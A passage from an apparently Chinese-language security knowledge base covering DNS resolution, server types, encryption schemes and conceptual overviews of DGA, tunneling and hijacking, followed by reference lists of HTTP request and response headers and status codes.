<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Refused</span> <span class="o">-</span> <span class="n">The</span> <span class="n">name</span> <span class="n">server</span> <span class="n">refuses</span> <span class="n">to</span> <span class="n">perform</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">operation</span> <span class="k">for</span> <span class="n">policy</span> <span class="n">reasons</span>
</pre></div>
</div>
<ul class="simple">
<li>NODATA</li>
</ul>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">A</span> <span class="n">pseudo</span> <span class="n">RCODE</span> <span class="n">which</span> <span class="n">indicates</span> <span class="n">that</span> <span class="n">the</span> <span class="n">name</span> <span class="ow">is</span> <span class="n">valid</span><span class="p">,</span> <span class="k">for</span> <span class="n">the</span> <span class="n">given</span> <span class="n">class</span><span class="p">,</span> <span class="n">but</span> <span class="p">[</span><span class="n">there</span><span class="p">]</span> <span class="n">are</span> <span class="n">no</span> <span class="n">records</span> <span class="n">of</span> <span class="n">the</span> <span class="n">given</span> <span class="nb">type</span> <span class="n">A</span> <span class="n">NODATA</span> <span class="n">response</span> <span class="n">has</span> <span class="n">to</span> <span class="n">be</span> <span class="n">inferred</span> <span class="kn">from</span> <span class="nn">the</span> <span class="n">answer</span><span class="o">.</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id6">
<h4>域名系统工作原理<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<div class="section" id="id7">
<h5>解析过程<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<p>DNS解析过程是递归查询的，具体过程如下：</p>
<ul class="simple">
<li>用户要访问域名www.example.com时，先查看本机hosts是否有记录或者本机是否有DNS缓存，如果有，直接返回结果，否则向递归服务器查询该域名的IP地址</li>
<li>递归缓存为空时，首先向根服务器查询com顶级域的IP地址</li>
<li>根服务器告知递归服务器com顶级域名服务器的IP地址</li>
<li>递归向com顶级域名服务器查询负责example.com的权威服务器的IP</li>
<li>com顶级域名服务器返回相应的IP地址</li>
<li>递归向example.com的权威服务器查询www.example.com的地址记录</li>
<li>权威服务器告知www.example.com的地址记录</li>
<li>递归服务器将查询结果返回客户端</li>
</ul>
</div>
<div class="section" id="id8">
<h5>域传送<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<p>DNS服务器可以分为主服务器、备份服务器和缓存服务器。域传送是指备份服务器从主服务器拷贝数据，并使用得到的数据更新自身数据库。域传送是在主备服务器之间同步数据库的机制。</p>
</div>
</div>
<div class="section" id="id9">
<h4>服务器类型<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<div class="section" id="id10">
<h5>根服务器<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h5>
<p>根服务器是DNS的核心，负责互联网顶级域名的解析，用于维护域的权威信息，并将DNS查询引导到相应的域名服务器。</p>
<p>根服务器在域名树中代表最顶级的 <code class="docutils literal notranslate"><span class="pre">.</span></code> 域， 一般省略。</p>
<p>13台IPv4根服务器的域名标号为a到m，即a.root-servers.org到m.root-servers.org，所有服务器存储的数据相同，仅包含ICANN批准的TLD域名权威信息。</p>
</div>
<div class="section" id="id11">
<h5>权威服务器<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h5>
<p>权威服务器上存储域名Zone文件，维护域内域名的权威信息，递归服务器可以从权威服务器获得DNS查询的资源记录。</p>
<p>权威服务器需要在所承载的域名所属的TLD管理局注册，同一个权威服务器可以承载不同TLD域名，同一个域也可以有多个权威服务器。</p>
</div>
<div class="section" id="id12">
<h5>递归服务器<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h5>
<p>递归服务器负责接收用户的查询请求，进行递归查询并响应用户查询请求。在初始时递归服务器仅有记录了根域名的Hint文件。</p>
</div>
</div>
<div class="section" id="id13">
<h4>DNS利用<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h4>
<div class="section" id="dga">
<h5>DGA<a class="headerlink" href="#dga" title="永久链接至标题">¶</a></h5>
<p>DGA（Domain Generate Algorithm，域名生成算法）是一种利用随机字符来生成C&amp;C域名，从而逃避域名黑名单检测的技术手段，常见于botnet中。一般来说，一个DGA域名的存活时间约在1-7天左右。</p>
<p>通信时，客户端和服务端都运行同一套DGA算法，生成相同的备选域名列表，当需要发动攻击的时候，选择其中少量进行注册，便可以建立通信，并且可以对注册的域名应用速变IP技术，快速变换IP，从而域名和IP都可以进行快速变化。</p>
<p>DGA域名有多种生成方式，根据种子类型可以分为确定性和不确定性的生成。不确定性的种子可能会选用当天的一些即时数据，如汇率信息等。</p>
</div>
<div class="section" id="id14">
<h5>DNS隧道<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h5>
<p>DNS隧道工具将进入隧道的其他协议流量封装到DNS协议内，在隧道上传输。这些数据包出隧道时进行解封装，还原数据。</p>
</div>
</div>
<div class="section" id="id15">
<h4>加密方案<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h4>
<p>作为主流的防御方案，DNS加密有五种方案，分别是 DNS-over-TLS (DoT)、DNS-over-DTLS、DNS-over-HTTPS (DoH)、DNS-over-QUIC以及DNSCrypt。</p>
<div class="section" id="dot">
<h5>DoT<a class="headerlink" href="#dot" title="永久链接至标题">¶</a></h5>
<p>DoT方案在2016年发表于RFC7858，使用853端口。主要思想是Client和Server通过TCP协议建立TLS会话后再进行DNS传输，Client通过SSL证书验证服务器身份。</p>
</div>
<div class="section" id="dns-over-dtls">
<h5>DNS-over-DTLS<a class="headerlink" href="#dns-over-dtls" title="永久链接至标题">¶</a></h5>
<p>DNS-over-DTLS和DoT类似，区别在于使用UDP协议而不是TCP协议。</p>
</div>
<div class="section" id="doh">
<h5>DoH<a class="headerlink" href="#doh" title="永久链接至标题">¶</a></h5>
<p>DoH方案在发表RFC8484，使用 <code class="docutils literal notranslate"><span class="pre">https://dns.example.com/dns-query{?dns}</span></code>  来查询服务器的IP，复用https的443端口，流量特征比较小。DoH会对DNS服务器进行加密认证，不提供fallback选项。目前Cloudflare、Google等服务商对DoH提供了支持。</p>
</div>
<div class="section" id="dns-over-quic">
<h5>DNS-over-QUIC<a class="headerlink" href="#dns-over-quic" title="永久链接至标题">¶</a></h5>
<p>DNS-over-QUIC安全特性和DoT类似，但是性能更高，目前没有合适的软件实现。</p>
</div>
<div class="section" id="dnscrypt">
<h5>DNSCrypt<a class="headerlink" href="#dnscrypt" title="永久链接至标题">¶</a></h5>
<p>DNSCrypt使用X25519-XSalsa20Poly1305而非标准的TLS，且DNSCrypt的Client需要额外的软件，Server需要的专门的证书。</p>
</div>
</div>
<div class="section" id="id16">
<h4>相关漏洞<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h4>
<div class="section" id="id17">
<h5>DNS劫持<a class="headerlink" href="#id17" title="永久链接至标题">¶</a></h5>
<p>DNS劫持有多种方式，比较早期的攻击方式是通过攻击域名解析服务器，或是伪造DNS响应的方法，来将域名解析到恶意的IP地址。</p>
<p>随着互联网应用的不断发展，出现了基于废弃记录的劫持方式。这种方式发生的场景是次级域名的解析记录指向第三方资源，而第三方资源被释放后，解析记录并没有取消，在这种场景下，可以对应申请第三方资源，以获取控制解析记录的能力。</p>
</div>
<div class="section" id="id18">
<h5>拒绝服务<a class="headerlink" href="#id18" title="永久链接至标题">¶</a></h5>
<p>DNS服务通常会开启UDP端口，当DNS服务器拥有大量二级域NS记录时，通过DNS的UDP反射攻击可以实现高倍的拒绝服务。</p>
</div>
</div>
<div class="section" id="id19">
<h4>参考链接<a class="headerlink" href="#id19" title="永久链接至标题">¶</a></h4>
<div class="section" id="rfc">
<h5>RFC<a class="headerlink" href="#rfc" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://tools.ietf.org/html/rfc1034">RFC 1034 DOMAIN NAMES CONCEPTS AND FACILITIES</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc1035">RFC 1035 DOMAIN NAMES IMPLEMENTATION AND SPECIFICATION</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc1123">RFC 1123 Requirements for Internet Hosts -- Application and Support</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc2535">RFC 2535 Domain Name System Security Extensions</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc2930">RFC 2930 Secret Key Establishment for DNS (TKEY RR)</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc2931">RFC 2931 DNS Request and Transaction Signatures ( SIG(0)s )</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc3596">RFC 3596 Legacy Resolver Compatibility for Delegation Signer (DS)</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc3755">RFC 3755 DNS Extensions to Support IP Version 6</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc5001">RFC 5001 Automated Updates of DNS Security (DNSSEC) Trust Anchors</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc5936">RFC 5936 DNS Zone Transfer Protocol</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc5966">RFC 5966 DNS Transport over TCP - Implementation Requirements</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc6376">RFC 6376 DomainKeys Identified Mail (DKIM) Signatures</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc6762">RFC 6762 Multicast DNS</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc6891">RFC 6891 Extension Mechanisms for DNS (EDNS(0))</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc6895">RFC 6895 DNS IANA Considerations</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc7766">RFC 7766 DNS Transport over TCP - Implementation Requirements</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc7858">RFC 7858 Specification for DNS over Transport Layer Security (TLS)</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc8082">RFC 8082 NXDOMAIN</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc8482">RFC 8482 Providing Minimal-Sized Responses to DNS Queries That Have QTYPE=ANY</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc8484">RFC 8484 DNS Queries over HTTPS (DoH)</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc8490">RFC 8490 DNS Stateful Operations</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc8499">RFC 8499 DNS Terminology</a></li>
</ul>
</div>
<div class="section" id="id20">
<h5>工具<a class="headerlink" href="#id20" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/NLnetLabs/unbound">Unbound</a></li>
<li><a class="reference external" href="https://github.com/isc-projects/bind9">bind9</a></li>
</ul>
</div>
<div class="section" id="id21">
<h5>研究文章<a class="headerlink" href="#id21" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://mp.weixin.qq.com/s/xbf0Qbppk8R0nx89Pb4YTg">DGA域名的今生前世：缘起、检测、与发展</a></li>
<li><a class="reference external" href="https://blog.thecjw.me/?p=1221">DNSSEC原理和分析</a></li>
<li>Plohmann D, Yakdan K, Klatt M, et al. A comprehensive measurement study of domain generating malware[C]//25th {USENIX} Security Symposium ({USENIX} Security 16). 2016: 263-278.</li>
<li>An End-to-End Large-Scale Measurement of DNS-over-Encryption: How Far Have We Come?</li>
</ul>
</div>
<div class="section" id="cve">
<h5>相关CVE<a class="headerlink" href="#cve" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/">SIGRed – Resolving Your Way into Domain Admin: Exploiting a 17 Year-old Bug in Windows DNS Servers</a></li>
</ul>
</div>
</div>
</div>
<span id="document-network/http/index"></span><div class="section" id="http">
<h3>HTTP协议簇<a class="headerlink" href="#http" title="永久链接至标题">¶</a></h3>
<div class="toctree-wrapper compound">
<span id="document-network/http/http"></span><div class="section" id="http">
<h4>HTTP标准<a class="headerlink" href="#http" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>报文格式<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<div class="section" id="id2">
<h6>请求报文格式<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h6>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">method</span><span class="o">&gt;&lt;</span><span class="n">request</span><span class="o">-</span><span class="n">URL</span><span class="o">&gt;&lt;</span><span class="n">version</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">headers</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">entity</span><span class="o">-</span><span class="n">body</span><span class="o">&gt;</span>
</pre></div>
</div>
</div>
<div class="section" id="id3">
<h6>响应报文格式<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h6>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;&lt;</span><span class="n">status</span><span class="o">&gt;&lt;</span><span class="n">reason</span><span class="o">-</span><span class="n">phrase</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">headers</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">entity</span><span class="o">-</span><span class="n">body</span><span class="o">&gt;</span>
</pre></div>
</div>
</div>
<div class="section" id="id4">
<h6>字段解释<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><dl class="first docutils">
<dt>method</dt>
<dd><ul class="first last">
<li>HTTP动词</li>
<li>常见方法：HEAD / GET / POST / PUT / DELETE / PATCH / OPTIONS / TRACE</li>
<li>扩展方法：LOCK / MKCOL / COPY / MOVE</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>version</dt>
<dd><ul class="first last">
<li>报文使用的HTTP版本</li>
<li>格式为HTTP/&lt;major&gt;.&lt;minor&gt;</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>url</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">&lt;scheme&gt;://&lt;user&gt;:&lt;password&gt;&#64;&lt;host&gt;:&lt;port&gt;/&lt;path&gt;;&lt;params&gt;?&lt;query&gt;#&lt;frag&gt;</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
<div class="section" id="id5">
<h5>请求头列表<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>Accept</dt>
<dd><ul class="first last">
<li>指定客户端能够接收的内容类型</li>
<li>Accept: text/plain, text/html</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Accept-Charset</dt>
<dd><ul class="first last">
<li>浏览器可以接受的字符编码集</li>
<li>Accept-Charset: iso-8859-5</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Accept-Encoding</dt>
<dd><ul class="first last">
<li>指定浏览器可以支持的web服务器返回内容压缩编码类型</li>
<li>Accept-Encoding: compress, gzip</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Accept-Language</dt>
<dd><ul class="first last">
<li>浏览器可接受的语言</li>
<li>Accept-Language: en,zh</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Accept-Ranges</dt>
<dd><ul class="first last">
<li>可以请求网页实体的一个或者多个子范围字段</li>
<li>Accept-Ranges: bytes</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Authorization</dt>
<dd><ul class="first last">
<li>HTTP授权的授权证书</li>
<li>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Cache-Control</dt>
<dd><ul class="first last">
<li>指定请求和响应遵循的缓存机制 Cache-Control: no-cache</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Connection</dt>
<dd><ul class="first last">
<li>表示是否需要持久连接 // HTTP 1.1默认进行持久连接</li>
<li>Connection: close</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Cookie</dt>
<dd><ul class="first last">
<li>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器</li>
<li>Cookie: role=admin;ssid=1</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Content-Length</dt>
<dd><ul class="first last">
<li>请求的内容长度</li>
<li>Content-Length: 348</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Content-Type</dt>
<dd><ul class="first last">
<li>请求的与实体对应的MIME信息</li>
<li>Content-Type: application/x-www-form-urlencoded</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Date</dt>
<dd><ul class="first last">
<li>请求发送的日期和时间</li>
<li>Date: Tue, 15 Nov 2010 08:12:31 GMT</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Expect</dt>
<dd><ul class="first last">
<li>请求的特定的服务器行为</li>
<li>Expect: 100-continue</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>From</dt>
<dd><ul class="first last">
<li>发出请求的用户的Email</li>
<li>From: <a class="reference external" href="mailto:user&#37;&#52;&#48;email&#46;com">user<span>&#64;</span>email<span>&#46;</span>com</a></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Host</dt>
<dd><ul class="first last">
<li>指定请求的服务器的域名和端口号</li>
<li>Host: www.github.com</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>If-Match</dt>
<dd><ul class="first last">
<li>只有请求内容与实体相匹配才有效</li>
<li>If-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>If-Modified-Since</dt>
<dd><ul class="first last">
<li>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</li>
<li>If-Modified-Since: Sat, 29 Oct 2018 19:43:31 GMT</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>If-None-Match</dt>
<dd><ul class="first last">
<li>如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</li>
<li>If-None-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>If-Range</dt>
<dd><ul class="first last">
<li>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</li>
<li>If-Range: &quot;737060cd8c284d8af7ad3082f209582d&quot;</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>If-Unmodified-Since</dt>
<dd><ul class="first last">
<li>只在实体在指定时间之后未被修改才请求成功</li>
<li>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Max-Forwards</dt>
<dd><ul class="first last">
<li>限制信息通过代理和网关传送的时间</li>
<li>Max-Forwards: 10</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Pragma</dt>
<dd><ul class="first last">
<li>用来包含实现特定的指令</li>
<li>Pragma: no-cache</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Proxy-Authorization</dt>
<dd><ul class="first last">
<li>连接到代理的授权证书</li>
<li>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Range</dt>
<dd><ul class="first last">
<li>只请求实体的一部分，指定范围</li>
<li>Range: bytes=500-999</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Referer</dt>
<dd><ul class="first last">
<li>先前网页的地址，当前请求网页紧随其后,即来路</li>
<li>Referer: <a class="reference external" href="http://www.zcmhi.com/archives/71.html">http://www.zcmhi.com/archives/71.html</a></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>TE</dt>
<dd><ul class="first last">
<li>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</li>
<li>TE: trailers,deflate;q=0.5</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Upgrade</dt>
<dd><ul class="first last">
<li>向服务器指定某种传输协议以便服务器进行转换（如果支持）</li>
<li>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>User-Agent</dt>
<dd><ul class="first last">
<li>User-Agent的内容包含发出请求的用户信息</li>
<li>User-Agent: Mozilla/5.0 (Linux; X11)</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Via</dt>
<dd><ul class="first last">
<li>通知中间网关或代理服务器地址，通信协议</li>
<li>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Warning</dt>
<dd><ul class="first last">
<li>关于消息实体的警告信息</li>
<li>Warn: 199 Miscellaneous warning</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id6">
<h5>响应头列表<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>Accept-Ranges</dt>
<dd><ul class="first last">
<li>表明服务器是否支持指定范围请求及哪种类型的分段请求</li>
<li>Accept-Ranges: bytes</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Access-Control-Allow-Origin</dt>
<dd><ul class="first last">
<li>配置有权限访问资源的域</li>
<li>Access-Control-Allow-Origin: &lt;origin&gt;|*</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Age</dt>
<dd><ul class="first last">
<li>从原始服务器到代理缓存形成的估算时间（以秒计，非负）</li>
<li>Age: 12</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Allow</dt>
<dd><ul class="first last">
<li>对某网络资源的有效的请求行为，不允许则返回405</li>
<li>Allow: GET, HEAD</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Cache-Control</dt>
<dd><ul class="first last">
<li>告诉所有的缓存机制是否可以缓存及哪种类型</li>
<li>Cache-Control: no-cache</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Content-Encoding</dt>
<dd><ul class="first last">
<li>web服务器支持的返回内容压缩编码类型。</li>
<li>Content-Encoding: gzip</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Content-Language</dt>
<dd><ul class="first last">
<li>响应体的语言</li>
<li>Content-Language: en,zh</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Content-Length</dt>
<dd><ul class="first last">
<li>响应体的长度</li>
<li>Content-Length: 348</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Content-Location</dt>
<dd><ul class="first last">
<li>请求资源可替代的备用的另一地址</li>
<li>Content-Location: /index.htm</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Content-MD5</dt>
<dd><ul class="first last">
<li>返回资源的MD5校验值</li>
<li>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Content-Range</dt>
<dd><ul class="first last">
<li>在整个返回体中本部分的字节位置</li>
<li>Content-Range: bytes 21010-47021/47022</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Content-Type</dt>
<dd><ul class="first last">
<li>返回内容的MIME类型</li>
<li>Content-Type: text/html; charset=utf-8</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Date</dt>
<dd><ul class="first last">
<li>原始服务器消息发出的时间</li>
<li>Date: Tue, 15 Nov 2010 08:12:31 GMT</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>ETag</dt>
<dd><ul class="first last">
<li>请求变量的实体标签的当前值</li>
<li>ETag: &quot;737060cd8c284d8af7ad3082f209582d&quot;</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Expires</dt>
<dd><ul class="first last">
<li>响应过期的日期和时间</li>
<li>Expires: Thu, 01 Dec 2010 16:00:00 GMT</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Last-Modified</dt>
<dd><ul class="first last">
<li>请求资源的最后修改时间</li>
<li>Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Location</dt>
<dd><ul class="first last">
<li>用来重定向接收方到非请求URL的位置来完成请求或标识新的资源</li>
<li>Location: <a class="reference external" href="http://www.zcmhi.com/archives/94.html">http://www.zcmhi.com/archives/94.html</a></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Pragma</dt>
<dd><ul class="first last">
<li>包括实现特定的指令，它可应用到响应链上的任何接收方</li>
<li>Pragma: no-cache</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Proxy-Authenticate</dt>
<dd><ul class="first last">
<li>它指出认证方案和可应用到代理的该URL上的参数</li>
<li>Proxy-Authenticate: Basic</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Refresh</dt>
<dd><ul class="first last">
<li>应用于重定向或一个新的资源被创造，在5秒之后重定向（由网景提出，被大部分浏览器支持）</li>
<li>Refresh: 5; url=http://www.zcmhi.com/archives/94.html</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Retry-After</dt>
<dd><ul class="first last">
<li>如果实体暂时不可取，通知客户端在指定时间之后再次尝试</li>
<li>Retry-After: 120</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Server</dt>
<dd><ul class="first last">
<li>web服务器软件名称</li>
<li>Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Set-Cookie</dt>
<dd><ul class="first last">
<li>设置Http Cookie Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Strict-Transport-Security</dt>
<dd><ul class="first last">
<li>设置浏览器强制使用HTTPS访问</li>
<li>max-age: x秒的时间内 访问对应域名都使用HTTPS请求</li>
<li>includeSubDomains: 网站的子域名也启用规则</li>
<li>Strict-Transport-Security: max-age=1000; includeSubDomains</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Trailer</dt>
<dd><ul class="first last">
<li>指出头域在分块传输编码的尾部存在 Trailer: Max-Forwards</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Transfer-Encoding</dt>
<dd><ul class="first last">
<li>文件传输编码</li>
<li>Transfer-Encoding:chunked</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Vary</dt>
<dd><ul class="first last">
<li>告诉下游代理是使用缓存响应还是从原始服务器请求</li>
<li>Vary: *</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Via</dt>
<dd><ul class="first last">
<li>告知代理客户端响应是通过哪里发送的</li>
<li>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Warning</dt>
<dd><ul class="first last">
<li>警告实体可能存在的问题</li>
<li>Warning: 199 Miscellaneous warning</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>WWW-Authenticate</dt>
<dd><ul class="first last">
<li>表明客户端请求实体应该使用的授权方案</li>
<li>WWW-Authenticate: Basic</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>X-Content-Type-Options</dt>
<dd><ul class="first last">
<li>配置禁止MIME类型嗅探</li>
<li>X-Content-Type-Options: nosniff</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>X-Frame-Options</dt>
<dd><ul class="first last">
<li>配置页面是否能出现在 &lt;frame&gt;, &lt;iframe&gt;, &lt;embed&gt;, &lt;object&gt; 等标签中，防止点击劫持</li>
<li>X-Frame-Options: deny</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>X-XSS-Protection</dt>
<dd><ul class="first last">
<li>配置XSS防护机制</li>
<li>X-XSS-Protection: 1; mode=block</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="http-1xx">
<h5>HTTP状态返回代码 1xx（临时响应）<a class="headerlink" href="#http-1xx" title="永久链接至标题">¶</a></h5>
<p>表示临时响应并需要请求者继续执行操作的状态代码。</p>
<table border="1" class="docutils">
<colgroup>
<col width="6%" />
<col width="10%" />
<col width="84%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">Code</th>
<th class="head">代码</th>
<th class="head">说明</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>100</td>
<td>继续</td>
<td>服务器返回此代码表示已收到请求的第一部分，正在等待其余部分</td>
</tr>
<tr class="row-odd"><td>101</td>
<td>切换协议</td>
<td>请求者已要求服务器切换协议，服务器已确认并准备切换</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="http-2xx">
<h5>HTTP状态返回代码 2xx （成功）<a class="headerlink" href="#http-2xx" title="永久链接至标题">¶</a></h5>
<p>表示成功处理了请求的状态代码。</p>
<table border="1" class="docutils">
<colgroup>
<col width="6%" />
<col width="12%" />
<col width="82%" />
</colgroup>
<thead valign="bottom">
